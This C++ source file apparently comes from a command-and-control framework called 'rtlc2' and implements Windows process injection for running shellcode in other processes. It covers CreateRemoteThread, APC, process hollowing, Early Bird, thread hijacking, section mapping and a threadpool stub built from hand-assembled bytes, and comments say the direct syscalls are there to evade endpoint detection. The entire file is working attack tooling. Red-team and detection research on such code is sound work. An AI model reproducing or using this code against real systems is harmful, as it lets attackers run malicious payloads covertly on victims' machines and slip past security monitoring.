// Process injection techniques - Windows only
#include "evasion.h"
#include "syscalls.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <tlhelp32.h>

namespace rtlc2 {
namespace evasion {
namespace injection {

// CreateRemoteThread injection
// Classic technique: allocate memory in target, write shellcode, create remote thread
// Enhanced with direct/indirect syscall support for EDR evasion
bool InjectCreateRemoteThread(uint32_t pid, const uint8_t* shellcode, size_t size) {
    HANDLE hProcess = NULL;

    if (syscalls::IsInitialized()) {
        // Use NtOpenProcess syscall
        struct { ULONG pid; HANDLE pad; } clientId = {};
        clientId.pid = pid;
        struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } oa = {};
        oa.Length = sizeof(oa);
        NTSTATUS st = syscalls::NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clientId);
        if (st != 0 || !hProcess) return false;
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return false;
    }

    LPVOID remoteMem = NULL;
    SIZE_T regionSize = size;

    if (syscalls::IsInitialized()) {
        NTSTATUS st = syscalls::NtAllocateVirtualMemory(hProcess, &remoteMem, 0,
            &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0 || !remoteMem) {
            syscalls::NtClose(hProcess);
            return false;
        }
    } else {
        remoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            CloseHandle(hProcess);
            return false;
        }
    }

    if (syscalls::IsInitialized()) {
        SIZE_T bytesWritten = 0;
        NTSTATUS st = syscalls::NtWriteVirtualMemory(hProcess, remoteMem,
            (PVOID)shellcode, size, &bytesWritten);
        if (st != 0) {
            syscalls::NtFreeVirtualMemory(hProcess, &remoteMem, &regionSize, MEM_RELEASE);
            syscalls::NtClose(hProcess);
            return false;
        }
    } else {
        if (!WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
    }

    // Change protection to execute
    ULONG oldProtect = 0;
    if (syscalls::IsInitialized()) {
        PVOID baseAddr = remoteMem;
        SIZE_T protSize = size;
        syscalls::NtProtectVirtualMemory(hProcess, &baseAddr, &protSize,
            PAGE_EXECUTE_READ, &oldProtect);
    } else {
        DWORD oldProt;
        VirtualProtectEx(hProcess, remoteMem, size, PAGE_EXECUTE_READ, &oldProt);
    }

    HANDLE hThread = NULL;
    if (syscalls::IsInitialized()) {
        NTSTATUS st = syscalls::NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
            hProcess, remoteMem, NULL, 0, 0, 0, 0, NULL);
        if (st != 0 || !hThread) {
            syscalls::NtFreeVirtualMemory(hProcess, &remoteMem, &regionSize, MEM_RELEASE);
            syscalls::NtClose(hProcess);
            return false;
        }
    } else {
        hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
    }

    if (syscalls::IsInitialized()) {
        syscalls::NtClose(hThread);
        syscalls::NtClose(hProcess);
    } else {
        CloseHandle(hThread);
        CloseHandle(hProcess);
    }
    return true;
}

// APC Injection
// Queue an APC to a thread in the target process
// Enhanced with direct/indirect syscall support for EDR evasion
bool InjectAPC(uint32_t pid, const uint8_t* shellcode, size_t size) {
    HANDLE hProcess = NULL;

    if (syscalls::IsInitialized()) {
        struct { ULONG pid; HANDLE pad; } clientId = {};
        clientId.pid = pid;
        struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } oa = {};
        oa.Length = sizeof(oa);
        NTSTATUS st = syscalls::NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clientId);
        if (st != 0 || !hProcess) return false;
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return false;
    }

    LPVOID remoteMem = NULL;
    SIZE_T regionSize = size;

    if (syscalls::IsInitialized()) {
        NTSTATUS st = syscalls::NtAllocateVirtualMemory(hProcess, &remoteMem, 0,
            &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0 || !remoteMem) {
            syscalls::NtClose(hProcess);
            return false;
        }
        SIZE_T bytesWritten = 0;
        syscalls::NtWriteVirtualMemory(hProcess, remoteMem, (PVOID)shellcode, size, &bytesWritten);
        PVOID baseAddr = remoteMem;
        SIZE_T protSize = size;
        ULONG oldProtect = 0;
        syscalls::NtProtectVirtualMemory(hProcess, &baseAddr, &protSize, PAGE_EXECUTE_READ, &oldProtect);
    } else {
        remoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            CloseHandle(hProcess);
            return false;
        }
        WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL);
        DWORD oldProtect;
        VirtualProtectEx(hProcess, remoteMem, size, PAGE_EXECUTE_READ, &oldProtect);
    }

    // Find a thread to inject into
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        if (syscalls::IsInitialized()) {
            syscalls::NtFreeVirtualMemory(hProcess, &remoteMem, &regionSize, MEM_RELEASE);
            syscalls::NtClose(hProcess);
        } else {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
        }
        return false;
    }

    bool injected = false;
    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (syscalls::IsInitialized()) {
                        NTSTATUS st = syscalls::NtQueueApcThread(hThread, remoteMem, NULL, NULL, NULL);
                        injected = (st == 0);
                    } else {
                        QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
                        injected = true;
                    }
                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    if (syscalls::IsInitialized()) {
        syscalls::NtClose(hProcess);
    } else {
        CloseHandle(hProcess);
    }
    return injected;
}

// Process Hollowing
// Create a suspended process, hollow it out, replace with payload
bool ProcessHollow(const char* target_exe, const uint8_t* payload, size_t size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Create suspended process
    if (!CreateProcessA(target_exe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Get thread context to find entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Allocate memory in target
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Write payload
    WriteProcessMemory(pi.hProcess, remoteMem, payload, size, NULL);

    // Update entry point (RIP for x64, EAX for x86)
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Eax = (DWORD)remoteMem;
#endif

    SetThreadContext(pi.hThread, &ctx);

    // Resume thread
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// Early Bird injection
// Create suspended process, inject via APC before main thread resumes
bool EarlyBirdInject(const char* target_exe, const uint8_t* shellcode, size_t size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Create process in suspended state
    if (!CreateProcessA(target_exe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Allocate and write shellcode
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, NULL);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, size, PAGE_EXECUTE_READ, &oldProtect);

    // Queue APC to the main thread (before it runs any code)
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);

    // Resume - the APC will execute before the process entry point
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// Thread Hijack Injection
// Suspend a thread, change its instruction pointer to point to shellcode,
// then resume. Avoids creating new remote threads (detected by many EDRs).
bool InjectThreadHijack(uint32_t pid, uint32_t tid, const uint8_t* shellcode, size_t size) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        CloseHandle(hProcess);
        return false;
    }

    // Suspend the target thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Get the current thread context (to save original instruction pointer)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Save original instruction pointer for resumption trampoline
#ifdef _WIN64
    DWORD64 originalIP = ctx.Rip;
#else
    DWORD originalIP = ctx.Eip;
#endif

    // Build trampoline: shellcode + [push originalIP; ret] to resume original execution
    // x64 trampoline: push imm64 requires: mov rax, imm64; push rax; ret
    //   48 B8 [8 bytes imm64]  ; mov rax, originalIP
    //   50                      ; push rax
    //   C3                      ; ret
    // = 12 bytes
    //
    // x86 trampoline: push imm32; ret
    //   68 [4 bytes imm32]  ; push originalIP
    //   C3                  ; ret
    // = 6 bytes

#ifdef _WIN64
    const size_t TRAMPOLINE_SIZE = 12;
#else
    const size_t TRAMPOLINE_SIZE = 6;
#endif

    size_t totalSize = size + TRAMPOLINE_SIZE;

    // Allocate memory in target process (RW initially)
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, totalSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Write the shellcode
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Build and write the trampoline at the end of shellcode
    uint8_t trampoline[12] = {0};

#ifdef _WIN64
    trampoline[0] = 0x48;  // REX.W
    trampoline[1] = 0xB8;  // mov rax, imm64
    memcpy(&trampoline[2], &originalIP, 8);
    trampoline[10] = 0x50; // push rax
    trampoline[11] = 0xC3; // ret
#else
    trampoline[0] = 0x68;  // push imm32
    memcpy(&trampoline[1], &originalIP, 4);
    trampoline[5] = 0xC3;  // ret
#endif

    WriteProcessMemory(hProcess, (BYTE*)remoteMem + size, trampoline, TRAMPOLINE_SIZE, NULL);

    // Change protection to RX
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, totalSize, PAGE_EXECUTE_READ, &oldProtect);

    // Set the thread's instruction pointer to our shellcode
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Eip = (DWORD)remoteMem;
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Resume the hijacked thread
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// NtCreateSection Mapping Injection
// Uses NtCreateSection + NtMapViewOfSection to share a memory section between
// the current process and the target process. Avoids VirtualAllocEx +
// WriteProcessMemory which are commonly hooked by EDR.
bool InjectNtCreateSection(uint32_t pid, const uint8_t* shellcode, size_t size) {
    // Dynamically resolve ntdll functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Function typedefs
    typedef NTSTATUS(NTAPI* NtCreateSection_t)(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        PLARGE_INTEGER MaximumSize,
        ULONG SectionPageProtection,
        ULONG AllocationAttributes,
        HANDLE FileHandle
    );

    typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );

    typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(
        HANDLE ProcessHandle,
        PVOID BaseAddress
    );

    // Resolve functions
    NtCreateSection_t pNtCreateSection =
        (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection_t pNtMapViewOfSection =
        (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t pNtUnmapViewOfSection =
        (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!pNtCreateSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection) {
        return false;
    }

    // Open target process
    HANDLE hProcess = NULL;
    if (syscalls::IsInitialized()) {
        struct { ULONG pid; HANDLE pad; } clientId = {};
        clientId.pid = pid;
        struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } oa = {};
        oa.Length = sizeof(oa);
        syscalls::NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clientId);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    if (!hProcess) return false;

    // Create a shared section (use syscall if available)
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = (LONGLONG)size;

    // SEC_COMMIT = 0x8000000
    NTSTATUS status = pNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,    // SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE
        NULL,                   // No object attributes
        &sectionSize,
        PAGE_EXECUTE_READWRITE, // Section protection
        0x8000000,              // SEC_COMMIT
        NULL                    // No file backing
    );

    if (status != 0 || !hSection) {
        CloseHandle(hProcess);
        return false;
    }

    // Map section into current process as RW (to write shellcode)
    PVOID localView = NULL;
    SIZE_T viewSize = 0; // Map entire section
    // InheritDisposition: ViewShare = 1, ViewUnmap = 2
    status = pNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &localView,
        0,              // ZeroBits
        0,              // CommitSize
        NULL,           // SectionOffset
        &viewSize,
        2,              // ViewUnmap
        0,              // AllocationType
        PAGE_READWRITE  // Local mapping is RW
    );

    if (status != 0 || !localView) {
        CloseHandle(hSection);
        CloseHandle(hProcess);
        return false;
    }

    // Write shellcode into the local view (this also writes to the shared section)
    memcpy(localView, shellcode, size);

    // Map section into target process as RX (execute-read)
    PVOID remoteView = NULL;
    SIZE_T remoteViewSize = 0;
    status = pNtMapViewOfSection(
        hSection,
        hProcess,
        &remoteView,
        0,              // ZeroBits
        0,              // CommitSize
        NULL,           // SectionOffset
        &remoteViewSize,
        2,              // ViewUnmap
        0,              // AllocationType
        PAGE_EXECUTE_READ // Remote mapping is RX
    );

    // Unmap the local view (we're done writing)
    pNtUnmapViewOfSection(GetCurrentProcess(), localView);

    if (status != 0 || !remoteView) {
        CloseHandle(hSection);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread at the mapped address in the target
    HANDLE hThread = NULL;
    if (syscalls::IsInitialized()) {
        NTSTATUS st = syscalls::NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
            hProcess, remoteView, NULL, 0, 0, 0, 0, NULL);
        if (st != 0 || !hThread) {
            CloseHandle(hSection);
            syscalls::NtClose(hProcess);
            return false;
        }
        syscalls::NtClose(hThread);
        CloseHandle(hSection);
        syscalls::NtClose(hProcess);
    } else {
        hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)remoteView, NULL, 0, NULL);
        if (!hThread) {
            CloseHandle(hSection);
            CloseHandle(hProcess);
            return false;
        }
        CloseHandle(hThread);
        CloseHandle(hSection);
        CloseHandle(hProcess);
    }
    return true;
}

// Pool Party Injection (TP_WORK variant)
// Abuses the Windows Thread Pool to execute shellcode in the target process.
// Uses TpAllocWork and TpPostWork from ntdll to create and submit a work item
// whose callback points to our shellcode. This avoids CreateRemoteThread.
//
// NOTE: This is a simplified version. The full Pool Party technique requires:
// 1. Duplicating a TP_POOL handle into the target process
// 2. Creating the TP_WORK item referencing the target's threadpool
// 3. Submitting the work item
// For practical use, we combine VirtualAllocEx + write with work item submission.
bool InjectPoolParty(uint32_t pid, const uint8_t* shellcode, size_t size) {
    // Resolve undocumented ntdll threadpool functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // TpAllocWork creates a threadpool work item
    // Signature: NTSTATUS TpAllocWork(PTP_WORK* WorkReturn, PTP_WORK_CALLBACK Callback,
    //                                  PVOID Context, PTP_CALLBACK_ENVIRON CallbackEnviron)
    typedef NTSTATUS(NTAPI* TpAllocWork_t)(
        PVOID* WorkReturn,
        PVOID Callback,
        PVOID Context,
        PVOID CallbackEnviron
    );

    // TpPostWork submits a work item to the thread pool
    // Signature: VOID TpPostWork(PTP_WORK Work)
    typedef VOID(NTAPI* TpPostWork_t)(PVOID Work);

    // TpReleaseWork releases a work item
    typedef VOID(NTAPI* TpReleaseWork_t)(PVOID Work);

    // NtQueryInformationWorkerFactory to find the target's worker factory
    typedef NTSTATUS(NTAPI* NtQueryInformationWorkerFactory_t)(
        HANDLE WorkerFactoryHandle,
        ULONG WorkerFactoryInformationClass,
        PVOID WorkerFactoryInformation,
        ULONG WorkerFactoryInformationLength,
        PULONG ReturnLength
    );

    TpAllocWork_t pTpAllocWork =
        (TpAllocWork_t)GetProcAddress(hNtdll, "TpAllocWork");
    TpPostWork_t pTpPostWork =
        (TpPostWork_t)GetProcAddress(hNtdll, "TpPostWork");
    TpReleaseWork_t pTpReleaseWork =
        (TpReleaseWork_t)GetProcAddress(hNtdll, "TpReleaseWork");

    if (!pTpAllocWork || !pTpPostWork || !pTpReleaseWork) {
        return false;
    }

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }

    // Write shellcode to target
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Change to RX
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, size, PAGE_EXECUTE_READ, &oldProtect);

    // Simplified approach: Create a work item in our own process with the callback
    // pointing to the remote memory address in the target. Then, duplicate the
    // work item handle into the target process and trigger execution.
    //
    // More practical approach: Use CreateRemoteThread to call TpAllocWork+TpPostWork
    // in the target process. The thread invokes the threadpool API which then calls
    // our shellcode as a callback.
    //
    // For the cleanest approach without CreateRemoteThread, we'd need to:
    // 1. Find the target's default threadpool (TppWorkerThread)
    // 2. Write a TP_WORK structure into the target's memory
    // 3. Insert it into the threadpool's work queue
    //
    // Here we use a hybrid: write a small stub that calls TpAllocWork+TpPostWork
    // with our shellcode address as the callback, then use QueueUserAPC to trigger it.

    // Build the stub that will run in the target process context:
    // The stub calls TpAllocWork(out, shellcode_addr, NULL, NULL) then TpPostWork(out)

    // Resolve addresses in the target (ntdll is loaded at the same address)
    FARPROC remoteTpAllocWork = GetProcAddress(hNtdll, "TpAllocWork");
    FARPROC remoteTpPostWork = GetProcAddress(hNtdll, "TpPostWork");

    if (!remoteTpAllocWork || !remoteTpPostWork) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

#ifdef _WIN64
    // x64 stub to call TpAllocWork and TpPostWork
    // We allocate space for the TP_WORK pointer on the stack
    //
    // sub rsp, 0x48         ; shadow space + alignment + local variable
    // lea rcx, [rsp+0x28]   ; rcx = &pWork (output pointer)
    // mov rdx, <shellcode>  ; rdx = callback address
    // xor r8, r8            ; r8 = NULL (context)
    // xor r9, r9            ; r9 = NULL (callback environ)
    // mov rax, <TpAllocWork>
    // call rax
    // test eax, eax
    // jnz .done
    // mov rcx, [rsp+0x28]   ; rcx = pWork
    // mov rax, <TpPostWork>
    // call rax
    // .done:
    // add rsp, 0x48
    // ret

    uint8_t tpStub[128];
    size_t tpStubLen = 0;

    // sub rsp, 0x48
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0x83;
    tpStub[tpStubLen++] = 0xEC; tpStub[tpStubLen++] = 0x48;

    // lea rcx, [rsp+0x28]
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0x8D;
    tpStub[tpStubLen++] = 0x4C; tpStub[tpStubLen++] = 0x24;
    tpStub[tpStubLen++] = 0x28;

    // mov rdx, <remoteMem> (shellcode callback address)
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0xBA;
    memcpy(&tpStub[tpStubLen], &remoteMem, 8); tpStubLen += 8;

    // xor r8, r8
    tpStub[tpStubLen++] = 0x4D; tpStub[tpStubLen++] = 0x31;
    tpStub[tpStubLen++] = 0xC0;

    // xor r9, r9
    tpStub[tpStubLen++] = 0x4D; tpStub[tpStubLen++] = 0x31;
    tpStub[tpStubLen++] = 0xC9;

    // mov rax, <TpAllocWork>
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0xB8;
    memcpy(&tpStub[tpStubLen], &remoteTpAllocWork, 8); tpStubLen += 8;

    // call rax
    tpStub[tpStubLen++] = 0xFF; tpStub[tpStubLen++] = 0xD0;

    // test eax, eax
    tpStub[tpStubLen++] = 0x85; tpStub[tpStubLen++] = 0xC0;

    // jnz .done (+14 bytes ahead, will patch)
    size_t jnzPos = tpStubLen;
    tpStub[tpStubLen++] = 0x75; tpStub[tpStubLen++] = 0x00; // placeholder

    // mov rcx, [rsp+0x28]
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0x8B;
    tpStub[tpStubLen++] = 0x4C; tpStub[tpStubLen++] = 0x24;
    tpStub[tpStubLen++] = 0x28;

    // mov rax, <TpPostWork>
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0xB8;
    memcpy(&tpStub[tpStubLen], &remoteTpPostWork, 8); tpStubLen += 8;

    // call rax
    tpStub[tpStubLen++] = 0xFF; tpStub[tpStubLen++] = 0xD0;

    // .done:
    size_t donePos = tpStubLen;
    // Patch jnz displacement
    tpStub[jnzPos + 1] = (uint8_t)(donePos - (jnzPos + 2));

    // add rsp, 0x48
    tpStub[tpStubLen++] = 0x48; tpStub[tpStubLen++] = 0x83;
    tpStub[tpStubLen++] = 0xC4; tpStub[tpStubLen++] = 0x48;

    // ret
    tpStub[tpStubLen++] = 0xC3;

#else
    // x86 stub to call TpAllocWork and TpPostWork
    // push 0                ; CallbackEnviron = NULL
    // push 0                ; Context = NULL
    // push <remoteMem>      ; Callback = shellcode address
    // lea eax, [esp+0xC]    ; space for output pointer (we'll use stack)
    // Actually, we need a place for the output pointer. Use a local var.
    //
    // sub esp, 0x10
    // lea eax, [esp]        ; eax = &pWork
    // push 0                ; CallbackEnviron
    // push 0                ; Context
    // push <remoteMem>      ; Callback
    // push eax              ; &pWork
    // mov eax, <TpAllocWork>
    // call eax
    // test eax, eax
    // jnz .done
    // push dword [esp+0x10] ; push pWork (at [esp] before the pushes)
    // mov eax, <TpPostWork>
    // call eax
    // .done:
    // add esp, 0x10
    // ret

    uint8_t tpStub[128];
    size_t tpStubLen = 0;

    DWORD remoteMemDw = (DWORD)(uintptr_t)remoteMem;
    DWORD tpAllocDw = (DWORD)(uintptr_t)remoteTpAllocWork;
    DWORD tpPostDw = (DWORD)(uintptr_t)remoteTpPostWork;

    // sub esp, 0x10
    tpStub[tpStubLen++] = 0x83; tpStub[tpStubLen++] = 0xEC; tpStub[tpStubLen++] = 0x10;

    // lea eax, [esp]
    tpStub[tpStubLen++] = 0x8D; tpStub[tpStubLen++] = 0x04; tpStub[tpStubLen++] = 0x24;

    // push 0 (CallbackEnviron)
    tpStub[tpStubLen++] = 0x6A; tpStub[tpStubLen++] = 0x00;

    // push 0 (Context)
    tpStub[tpStubLen++] = 0x6A; tpStub[tpStubLen++] = 0x00;

    // push remoteMem (Callback)
    tpStub[tpStubLen++] = 0x68;
    memcpy(&tpStub[tpStubLen], &remoteMemDw, 4); tpStubLen += 4;

    // push eax (&pWork)
    tpStub[tpStubLen++] = 0x50;

    // mov eax, <TpAllocWork>
    tpStub[tpStubLen++] = 0xB8;
    memcpy(&tpStub[tpStubLen], &tpAllocDw, 4); tpStubLen += 4;

    // call eax
    tpStub[tpStubLen++] = 0xFF; tpStub[tpStubLen++] = 0xD0;

    // test eax, eax
    tpStub[tpStubLen++] = 0x85; tpStub[tpStubLen++] = 0xC0;

    // jnz .done
    size_t jnzPos = tpStubLen;
    tpStub[tpStubLen++] = 0x75; tpStub[tpStubLen++] = 0x00;

    // push dword [esp] (pWork is at [esp] after stack adjustment)
    tpStub[tpStubLen++] = 0xFF; tpStub[tpStubLen++] = 0x34; tpStub[tpStubLen++] = 0x24;

    // mov eax, <TpPostWork>
    tpStub[tpStubLen++] = 0xB8;
    memcpy(&tpStub[tpStubLen], &tpPostDw, 4); tpStubLen += 4;

    // call eax
    tpStub[tpStubLen++] = 0xFF; tpStub[tpStubLen++] = 0xD0;

    // .done:
    size_t donePos = tpStubLen;
    tpStub[jnzPos + 1] = (uint8_t)(donePos - (jnzPos + 2));

    // add esp, 0x10
    tpStub[tpStubLen++] = 0x83; tpStub[tpStubLen++] = 0xC4; tpStub[tpStubLen++] = 0x10;

    // ret
    tpStub[tpStubLen++] = 0xC3;
#endif

    // Write the TP stub into the target process
    LPVOID remoteStub = VirtualAllocEx(hProcess, NULL, tpStubLen,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStub) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, remoteStub, tpStub, tpStubLen, NULL);

    DWORD stubProtect;
    VirtualProtectEx(hProcess, remoteStub, tpStubLen, PAGE_EXECUTE_READ, &stubProtect);

    // Find a thread in the target to queue APC
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    bool submitted = false;
    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                           FALSE, te.th32ThreadID);
                if (hThread) {
                    // Queue APC to execute the TP stub
                    if (QueueUserAPC((PAPCFUNC)remoteStub, hThread, 0)) {
                        submitted = true;
                    }
                    CloseHandle(hThread);
                    if (submitted) break;
                }
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    CloseHandle(hProcess);
    return submitted;
}

} // namespace injection
} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
